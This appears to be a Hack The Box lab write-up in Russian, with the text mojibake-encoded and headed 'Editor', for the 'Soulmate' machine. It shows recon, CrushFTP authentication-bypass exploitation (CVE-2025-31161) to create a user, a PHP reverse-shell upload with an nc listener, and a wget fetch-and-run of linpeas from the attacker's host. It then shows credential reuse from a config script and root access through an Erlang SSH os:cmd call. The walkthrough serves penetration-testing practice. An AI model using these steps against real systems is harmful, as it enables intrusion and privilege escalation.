# üìù Write-up: Editor (Hack The Box)

![editor](https://app.hackthebox.com/machines/Soulmate)

**Difficulty:** Easy
**Platform:** Hack The Box
**Target host (lab):** `soulmate.htb` ‚Äî `10.10.11.86 ` (add to `/etc/hosts`)
**Link:** [Soulmate @ HTB](https://app.hackthebox.com/machines/Soulmate)

---

## üéØ Summary

Soulmate ‚Äî –ª—ë–≥–∫–∞—è Linux-–º–∞—à–∏–Ω–∞. –ö–ª—é—á–µ–≤—ã–µ —à–∞–≥–∏:

* –ò–Ω–∏—Ü–∏–∞–ª—å–Ω—ã–π –¥–æ—Å—Ç—É–ø —á–µ—Ä–µ–∑ **—É—è–∑–≤–∏–º–æ—Å—Ç—å –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –≤ CrushFTP –≤–µ—Ä—Å–∏–∏ –¥–æ 11.3.1** CVE-2025-31161 (–∏–ª–∏ 2825, Immersive Labs PoC).
* –ì–æ—Ä–∏–∑–æ–Ω—Ç–∞–ª—å–Ω–∞—è —ç—Å–∫–∞–ª–∞—Ü–∏—è: –ø–µ—Ä–µ–∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–∞—Ä–æ–ª—è –∏–∑ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏.
* –≠—Å–∫–∞–ª–∞—Ü–∏—è –¥–æ root —á–µ—Ä–µ–∑ –Ω–µ–±–µ–∑–æ–ø–∞—Å–Ω—É—é –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é Erlang/OTP ssh –¥–µ–º–æ–Ω–∞
---

## üìã Table of Contents



---

## üîí Prerequisites / Notes

* –≠—Ç–æ write-up –¥–ª—è —É—á–µ–±–Ω–æ–π (CTF/lab) —Å—Ä–µ–¥—ã Hack The Box ‚Äî **–Ω–µ –∑–∞–ø—É—Å–∫–∞—Ç—å –ø—Ä–æ—Ç–∏–≤ –ø—Ä–æ–¥–∞–∫—à–Ω-—Å–∏—Å—Ç–µ–º**.
* –í –º–æ–∏—Ö –ø—Ä–∏–º–µ—Ä–∞—Ö `soulmate.htb` —Ä–µ–∑–æ–ª–≤–∏—Ç—Å—è –≤ `10.10.11.86`. –î–æ–±–∞–≤—å—Ç–µ –≤ `/etc/hosts`:

```bash
# add on –∞—Ç–∞–∫—É—é—â–µ–π –º–∞—à–∏–Ω–µ
echo "10.10.11.86 soulmate.htb" | sudo tee -a /etc/hosts
```

* –Ø —É–¥–∞–ª–∏–ª —è–≤–Ω—ã–µ –ø–ª–µ–π—Å—Ö–æ–ª–¥–µ—Ä—ã –∏ —É–∫–∞–∑–∞–ª, –≥–¥–µ –ø–æ–¥—Å—Ç–∞–≤–ª—è—Ç—å —Å–≤–æ–∏ –∑–Ω–∞—á–µ–Ω–∏—è: `<YOUR_IP>` ‚Äî IP –≤–∞—à–µ–π –∞—Ç–∞–∫—É—é—â–µ–π –º–∞—à–∏–Ω—ã –¥–ª—è –æ–±—Ä–∞—Ç–Ω–æ–≥–æ —à–µ–ª–ª–∞.

---

## üîç Reconnaissance

–°–Ω–∞—á–∞–ª–∞  –ø–æ—Ä—Ç-—Å–∫–∞–Ω `nmap`:

```bash
nmap -sC -sV -p22,80,443,20 soulmate.htb
```

–ü—Ä–∏–º–µ—Ä –≤—ã–≤–æ–¥–∞ (—Å–æ–∫—Ä–∞—â—ë–Ω–Ω–æ):
```
PORT    STATE SERVICE   VERSION
20/tcp  open  ftp-data?
22/tcp  open  ssh?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp  open  http?
443/tcp open  https?
```

---

## üïµÔ∏è Enumeration

### üåê HTTP ‚Äî –ø–æ—Ä—Ç 80

* –ü—Ä–∏ –ø–µ—Ä–µ—Ö–æ–¥–µ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É http://soulmate.htb –≤ –±—Ä–∞—É–∑–µ—Ä–µ –ø–æ–∫–∞–∑–∞–ª—Å—è —Å–∞–π—Ç –¥–ª—è –∑–Ω–∞–∫–æ–º—Å—Ç–≤.
–Ø –∑–∞–ø—É—Å—Ç–∏–ª ffuf –¥–ª—è –ø–æ–∏—Å–∫–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π, —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã:

```
index.php               [Status: 200, Size: 16688, Words: 6110, Lines: 306, Duration: 687ms]
login.php               [Status: 200, Size: 8554, Words: 3167, Lines: 178, Duration: 67ms]
register.php            [Status: 200, Size: 11107, Words: 4492, Lines: 238, Duration: 72ms]
profile.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 73ms]
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 65ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 67ms]
dashboard.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 133ms]
```
–ü—Ä–∏ –ø–æ–ø—ã—Ç–∫–µ –∑–∞–ª–æ–≥–∏–Ω–∏—Ç—å—è —Å –ø–æ–º–æ—â—å—é sql –∑–∞–ø—Ä–æ—Å–æ–≤ —Å–µ—Ä–≤–µ—Ä –≤–µ–ª —Å–µ–±—è —Å—Ç—Ä–∞–Ω–Ω–æ 
![–°—Ç—Ä–∞–Ω–æ–æ—Å—Ç—å] (imageSql.php)
* –≠—Ç–æ –º—ã –∑–∞–ø–æ–Ω–∏–º–∞–µ–º –∏ –∫–æ–ø–∞–µ–º –¥–∞–ª—å—à–µ


### üåê –ü–æ—Ä—Ç 20 - FTP

* –ö –ø–æ—Ä—Ç—É `20` –Ω–µ –ø–æ–ª—É—á–∏–ª–æ—Å—å –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è
* –ó–∞–ø—É—Å–∫–∞–µ–º  –æ–ø—è—Ç—å ffuf –¥–ª—è –ø–æ–∏—Å–∫–∞ —Å—É–±–¥–æ–º–µ–Ω–æ–≤ 

```bash
ffuf -u http://10.10.11.86 -H "Host: FUZZ.soulmate.htb"  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 4
```
* –†–µ–∑—É–ª—å—Ç–∞—Ç—ã 
```
ftp.soulmate.htb [Status: 302 Redirect]
```
<!-- –ù–µ –∑–∞–±—ã–≤–∞–µ–º  -->
echo "10.10.11.86 ftp.soulmate.htb" | sudo tee -a /etc/hosts

### ‚ö° –ü–æ—Ä—Ç 20 ‚Äî CrushFTP Version: 11.3.0_2

* –û–±–Ω–∞—Ä—É–∂–µ–Ω –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å —Å–æ —Å—Ç—Ä–∞–Ω–∏—Ü–µ–π –ª–æ–≥–∏–Ω–∞ –∏ –≤–µ—Ä—Å–∏—è CrushFTP ; –Ω–∞–π–¥–µ–Ω—ã —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –¥–ª—è —ç—Ç–æ–π –≤–µ—Ä—Å–∏–∏  `crushftp-CVE-2025-2825   --> https://github.com/punitdarji/crushftp-CVE-2025-2825/blob/main/payload ` –∏ `CVE-2025-31161 -->  https://github.com/Immersive-Labs-Sec/CVE-2025-31161`

* crushftp-CVE-2025-2825 —Å –µ–≥–æ –ø–æ–º–æ—â—å—é —è –ø–æ–ª—É—á–∏–ª–∏ —Å–ø–∏—Å–æ–∫ —é–∑–µ—Ä–æ–≤ –∞–¥–º–∏–Ω –ø–∞–Ω–µ–ª–∏
![–°–ø–∏—Å–æ–∫_—é–∑–µ—Ä–æ–≤] (image1.phg)

* –° –ø–æ–º–æ—â—å—é CVE-2025-31161 –ø–æ–ª—É—á–∏–ª–æ—Å—å –æ—Ç –∏–º–µ–Ω–∏ —Ä—É—Ç–∞(root) —Å–æ–∑–¥–∞—Ç—å –Ω–æ–≤–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –±–µ–∑ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏.
```bash
python cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user xss --password xss123
```
* –ü–æ–ª—É—á–∏–ª–æ—Å—å –≤–æ–π—Ç–∏ –≤ —Å–∏—Å—Ç–µ–º—É –∫–∞–∫ xss
![–ê–¥–º–∏–Ω_–∞–≤–ø–µ–ª—å] (image2.png)

* –ü–æ—Ç—ã–∫–∞–≤ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ ` http://ftp.soulmate.htb/WebInterface/UserManager/index.htm` —è –æ–±–Ω–∞—Ä—É–∂–∏–ª —Å–ø–∏—Å–æ–∫ —é–∑–µ—Ä–æ–≤

* –Ø –∏–∑–º–µ–Ω–∏–ª –∏—Ö –ø–∞—Ä–æ–ª–∏ –∏ –≤–æ—à–µ–ª –≤ —Å–∏—Å—Ç–µ–º—É, —Ç–æ–ª—å–∫–æ —É bena –±—ã–ª–∏ –æ–±—Ä–∞—Ä—É–∂–µ–Ω—ã –∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ —Å —Ñ–∞–π–ª–∞–º–∏
![ben] (image3.png)
```
/IT/ ‚Äì –§–∞–π–ª—ã –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–æ–Ω–Ω—ã—Ö —Ç–µ—Ö–Ω–æ–ª–æ–≥–∏–π
/ben/ ‚Äì –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∞—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è
/webProd/ ‚Äì –î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –≤–µ–±-–ø—Ä–æ–¥—É–∫—Ü–∏–∏ (—Ü–µ–ª–µ–≤–∞—è –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–æ–≤)
```

* –Ø –∑–∞–≥—Ä—É–∑–∏–ª –Ω–∞ webProd monkey.php –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –æ–±—Ä–∞—Ç–Ω–æ–π –æ–±–æ–ª–æ—á–∫–∏ 
* –ù–∞ –¥—Ä—É–≥–æ–º —Ç–µ—Ä–º–∏–Ω–∞–ª–µ —è –∑–∞–ø—É—Å—Ç–∏–ª netcat –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
```bash
nc -lnvp 4444
```
* –ü–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏ php —Ñ–∞–π–ª–∞ –ø–µ—Ä–µ—Ö–æ–¥–∏–º –ø–æ –∞–¥—Ä–µ—Å—É `http://soulmate.htb/monkey.php`
* –ë–∏–Ω–≥–æ —É –Ω–∞—Å –æ–±—Ä–∞—Ç–Ω–∞—è –æ–±–æ–ª–æ—á–∫–∞ !

### –ü–æ–ª—É—á–µ–Ω–∏–µ –æ–±—Ä–∞—Ç–Ω–æ–π –æ–±–æ–ª–æ—á–∫–∏
```bash
nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.184] from (UNKNOWN) [10.10.11.86] 44832
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

## –ü–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–µ —Å–∏—Å—Ç–µ–º—ã 
* –í –ø–µ—Ä–≤—É—é –æ—á–µ—Ä–µ–¥—å —è –æ—Ç–∫—Ä—ã–ª —É —Å–µ–±—è –ø—Ä–æ—Å—Ç–æ–π http-server
```bash
python3 -m http.server 8000
```
* –ê –Ω–∞ —Ü–µ–ª–µ–≤–æ–π –º–∞—à–∏–Ω–µ —è –∑–∞–≥—Ä—É–∑–∏–ª –∏ –∏—Å–ø–æ–ª–Ω–∏–ª linpeas.sh
```bash
cd /tmp/
wget http://10.10.14.184:8000/linpeas.sh -O lin.sh
chmod +x lin.sh
./lin.sh
```

### –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ 
```bash
root  1048  0.0  1.8 2260044 72276 ? Ssl 16:06 0:03 /usr/local/lib/erlang_login/start.escript -B
```

* –ü—Ä–∏ –∏–∑—É—á–µ–Ω–∏–∏ —Å–∫—Ä–∏–ø—Ç–∞ —è –Ω–∞—à–µ–ª –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–æ–Ω–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ —é–∑–µ—Ä–∞ ben
```bash
cat /usr/local/lib/erlang_login/start.escript
.......
{auth_methods, "publickey,password"},
{user_passwords, [{"ben", "HouseH0ldings998"}]}

```

### –ü–æ–ª—É—á–µ–Ω–∏–µ user.txt

* –Ø –ø–æ–¥–∫–ª—é—á–∏–ª—Å—è –ø–æ ssh –∏—Å–ø–æ–ª—å–∑—É—è –∫—Ä–µ–¥—ã —é–∑–µ—Ä–∞ ben
```bash
ssh ben@soulmate
Password: HouseH0ldings998
```
* –ü–µ—Ä–≤—ã–π —Ñ–ª–∞–≥ –≥–æ—Ç–æ–≤
```bash
ben@soulmate:~$ cat user.txt
81b8219692204e627f7e41a11e42b26b
```

## –≠—Å–∫–∞–ª–∞—Ü–∏—è –ø—Ä–∏–≤–µ–ª–µ–≥–∏–π –¥–æ —Ä—É—Ç–∞ 

* –Ø –ø—Ä–æ–≤–µ–∏–ª —Å–≤–æ–∏ –ø—Ä–∞–≤–∞ —á–µ—Ä–µ–∑ `sudo -l`
```bash
ben@soulmate:~$ sudo -l
[sudo] password for ben:
Sorry, user ben may not run sudo on soulmate.
```

* –•–æ—Ä–æ—à–æ –∞ –∫–∞–∫ –Ω–∞—Å—á–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ—Ä—Ç–æ–≤ 
![–ü–æ—Ä—Ç—ã] (image4.png)

### –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ–≥–æ  –ø—Ä–æ—Ü–µ—Å—Å–∞ –Ω–∞ –ø–æ—Ä—Ç—É 2222

* –≠—Ç–æ –±—ã–ª–∞ —Å–ª—É–∂–±–∞ Erlang SSH, –∑–∞–ø—É—â–µ–Ω–Ω–∞—è –Ω–∞ –ø–æ—Ä—Ç—É 2222 –æ—Ç —Ä—É—Ç–∞
* –Ø –ø–æ–ø—ã—Ç—ã–ª—Å—è –∏—Å–ø–æ–ª—å–∑—É—è —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ bena –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –ø–æ localhost—É —Å –ø–æ–º–æ—â—å—é ssh
```bash
ben@soulmate:~$ ssh ben@localhost -p 2222
Password: HouseH0ldings998
```
* –Ø –ø–æ–ª—É—á–∏–ª –æ–±–æ–ª–æ—á–∫—É 
```bash
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
(ssh_runner@soulmate)1>
```
* –Ø –∏—Å–æ–ª—å–∑—É—è chatGPT –ø–æ–Ω—è–ª –∫–∞–∫ —Ä–∞–±–æ–∞—Ç—å —Å —ç—Ç–æ–π –æ–±–æ–ª–æ—á–∫–æ–π 
```bash
(ssh_runner@soulmate)1> os:cmd("id").
"uid=0(root) gid=0(root) groups=0(root)\n"
```

### –ß—Ç–µ–Ω–∏–µ —Ñ–ª–∞–≥–∞ root.txt
```bash
(ssh_runner@soulmate)2> os:cmd("cat /root/root.txt").
```
![root.txt] (image.png)
 

 ## –ó–∞–∫–ª—é—é—á–µ–Ω–∏–µ 
 *     "Soulmate" –Ω–∞ HackTheBox ‚Äî –æ—Ç–ª–∏—á–Ω—ã–π –≤–∞—Ä–∏–∞–Ω—Ç –¥–ª—è —Ç–µ—Ö, –∫—Ç–æ —Ç–æ–ª—å–∫–æ –Ω–∞—á–∏–Ω–∞–µ—Ç —Ä–∞–∑–±–∏—Ä–∞—Ç—å—Å—è –≤ –ø–µ–Ω—Ç–µ—Å—Ç–µ. –ù–∞ —ç—Ç–æ–π –º–∞—à–∏–Ω–µ —Ç—ã –Ω–∞ –ø—Ä–∞–∫—Ç–∏–∫–µ –∏–∑—É—á–∏—à—å –æ—Å–Ω–æ–≤—ã –≤–∑–ª–æ–º–∞ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π, —Ä–∞–±–æ—Ç—É —Å —Ä–µ–≤–µ—Ä—Å-—à–µ–ª–ª–∞–º–∏ –∏ —Å–ø–æ—Å–æ–±—ã –ø–æ–ª—É—á–µ–Ω–∏—è –ø—Ä–∞–≤ root.

    –°–ø–∞—Å–∏–±–æ, —á—Ç–æ –¥–æ—á–∏—Ç–∞–ª–∏! –ù–∞–¥–µ—é—Å—å, —ç—Ç–æ—Ç –≥–∞–π–¥ –æ–∫–∞–∑–∞–ª—Å—è –ø–æ–ª–µ–∑–Ω—ã–º –∏ –ø–æ–º–æ–∂–µ—Ç —Ç–µ–±–µ –ø–æ–∫–æ—Ä—è—Ç—å –¥—Ä—É–≥–∏–µ —Ö–∞–∫–µ—Ä—Å–∫–∏–µ –ø–æ–ª–∏–≥–æ–Ω—ã.